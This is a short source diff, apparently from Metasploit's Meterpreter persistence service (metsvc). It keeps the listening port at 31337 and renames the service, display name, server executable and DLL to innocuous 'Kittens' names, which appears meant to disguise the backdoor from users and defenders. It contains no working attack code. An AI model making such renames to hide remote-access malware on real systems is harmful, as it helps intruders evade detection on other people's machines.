@@ -28,7 +28,7 @@
  */
 
 #define PORT          31337
-#define SERVICE_NAME  "metsvc"
-#define DISPLAY_NAME  "Meterpreter"
-#define METSVC_SERVER "metsvc-server.exe"
-#define METSRV_DLL    "metsrv.dll"
+#define SERVICE_NAME  "kittensSvc"
+#define DISPLAY_NAME  "Kittens"
+#define METSVC_SERVER "kittensSvc-server.exe"
+#define METSRV_DLL    "kittensSvc.dll"
